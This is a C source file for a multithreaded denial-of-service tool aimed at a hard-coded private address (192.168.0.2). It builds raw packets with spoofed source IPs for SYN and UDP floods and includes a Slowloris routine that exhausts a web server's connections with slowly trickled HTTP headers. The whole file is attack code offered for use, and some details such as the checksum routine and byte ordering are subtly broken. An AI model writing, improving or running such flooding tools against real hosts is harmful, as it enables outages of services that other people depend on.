#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>


typedef enum {
    UDP_FLOOD,
    SYN_FLOOD
} Attack;


#define THREADS             8
#define SOCKETS_SLOWLORRIS  200
#define ATTACK              SYN_FLOOD
#define PACKET_LENGTH       64
#define HTTP_BUFFER         256
#define TIMEOUT             5


struct attack {
    in_addr_t ip_victim;
    in_addr_t ip_spoofed;
    in_addr_t cidr_spoofed;
    int protocol;
};


uint16_t checksum(char *header, int words)
{
    uint16_t sum;
    while (words > 0) {
        sum += *header++;
        words--;
    }
    return ~sum;
}


int randint(int a, int b)
{
    return rand() % (b - a + 1) + a;
}

in_addr_t ip_random(in_addr_t net, int cidr)
{
    in_addr_t net_mask = (~0 << (32 - cidr));
    in_addr_t host_mask = ~net_mask;
    in_addr_t target_host = 0;
    if (host_mask != 0)
        target_host = rand() % host_mask;

    return htonl(
        (ntohl(net) & net_mask) | target_host
    );
}

int packet_dump(char *buffer, int length)
{
    for (int i = 0; i < length; i++)
        printf("%02x ", ((uint8_t *)buffer)[i]);
    putchar('\n');
}

void *flood(void *value)
{
    char buffer[PACKET_LENGTH];
    int s;
    int one = 1;
    struct ifreq ifr;
    struct attack *packet = (struct attack *)value;
    
    
    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Error socket()");
        pthread_exit(NULL);
    }
    
    memset (&ifr, 0, sizeof (ifr));
    strcpy(ifr.ifr_name, "enp3s0");
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        perror ("ioctl() failed to find interface ");
        pthread_exit(NULL);
    }
    printf ("Index for interface %i\n", ifr.ifr_ifindex);
    
    
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
         perror("Error: setsockopt()");
         pthread_exit(NULL);
    }
    
    if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof (ifr)) < 0) {
        perror ("setsockopt() failed to bind to interface ");
        pthread_exit(NULL);
    }

    //for (int i = 0; i < 10; i++) {
    while (1) {
        int length = sizeof(struct iphdr);
        memset(buffer, 0, PACKET_LENGTH);

        struct iphdr *ip = (struct iphdr *)buffer;
        struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
        struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));

        in_addr_t ip_src = ip_random(packet->ip_spoofed, packet->cidr_spoofed);
        uint16_t src_port = htons(randint(30000, 65535));
        uint16_t dst_port = htons(randint(1, 49151));
	
        switch (packet->protocol) {
            case UDP_FLOOD:
                length += sizeof(struct udphdr);
                udp->source = src_port;
                udp->dest = dst_port;
                udp->len = htons(sizeof(struct udphdr));
                ip->protocol = IPPROTO_UDP;
                break;
            case SYN_FLOOD:
                length += sizeof(struct tcphdr);
                tcp->source = src_port;
                tcp->dest = 8080;
                tcp->seq = htonl(rand());
                tcp->ack_seq = 0;
                tcp->doff = 5;
                tcp->syn = 1;
                tcp->window = htons(32767);
                ip->protocol = IPPROTO_TCP;
                break;
        }

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = dst_port;
        sin.sin_addr.s_addr = packet->ip_victim;

        ip->ihl = 5;
        ip->version = 4;
        // ip->tos = 16;
        ip->tot_len = length;
        //ip->id  = htons(54321);
        ip->ttl = 64;
        ip->saddr = ip_src;
        ip->daddr = packet->ip_victim;
        ip->check = checksum(buffer, sizeof(struct iphdr));
        
        //packet_dump(buffer,  ip->tot_len);
        sendto(s, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(s);
}


int restart_connection()
{
    // https://github.com/gkbrk/slowloris/blob/master/slowloris.py
    const char *user_agents[] = {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    };
    
    struct sockaddr_in victim = {
        .sin_family = AF_INET,
        .sin_port = htons(80)
    };
    victim.sin_addr.s_addr = inet_addr("192.168.0.2");
    
    int s;
    char buffer[HTTP_BUFFER];
    
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Error socket()");
    }
    connect(s, (struct sockaddr *)&victim, sizeof(victim));
    
    snprintf(buffer, HTTP_BUFFER, "GET /?%d HTTP/1.1\r\n", randint(0, 1000));
    send(s, buffer, strlen(buffer), 0);
    snprintf(buffer, HTTP_BUFFER, "User-Agent: %s\r\n", user_agents[rand() % 5]);
    send(s, buffer, strlen(buffer), 0);
    snprintf(buffer, HTTP_BUFFER, "Accept-language: sk-SK\r\n");
    send(s, buffer, strlen(buffer), 0);
    
    return s;
}

void *slow_lorris(void *value)
{
    char buffer[HTTP_BUFFER];
    int sockets[SOCKETS_SLOWLORRIS / THREADS];
    
    printf("Slow Lorris - connections: %d\n", SOCKETS_SLOWLORRIS / THREADS);
    for (int i = 0; i < SOCKETS_SLOWLORRIS / THREADS; i++)
        sockets[i] = restart_connection();

    while(1) {
        for (int i = 0; i < SOCKETS_SLOWLORRIS / THREADS; i++) {
            snprintf(buffer, 256, "X-a: %d\r\n", randint(1, 50000));
            if (send(sockets[i], buffer, strlen(buffer), 0) < 0) {
                perror("Error send()");
                close(sockets[i]);
                sockets[i] = restart_connection();
                if (send(sockets[i], buffer, strlen(buffer), 0) < 0) {
                     perror("Error send()");
                }
            }
        }
        sleep(TIMEOUT);
    }
    
     for (int i = 0; i < SOCKETS_SLOWLORRIS / THREADS; i++)
        close(sockets[i]);

}

int main(void)
{
    srand(time(NULL));
    pthread_t attackers[THREADS];

    struct attack nodes = {
        .ip_victim = inet_addr("192.168.0.2"),
        .ip_spoofed = inet_addr("192.168.0.5"),
        .cidr_spoofed = 32,
        .protocol = ATTACK
    };

    for (int i = 0; i < THREADS; i++)
        pthread_create(&attackers[i], NULL, flood, &nodes);
        //pthread_create(&attackers[i], NULL, slow_lorris, &nodes);

    for (int i = 0; i < THREADS; i++)
        pthread_join(attackers[i], NULL);
}
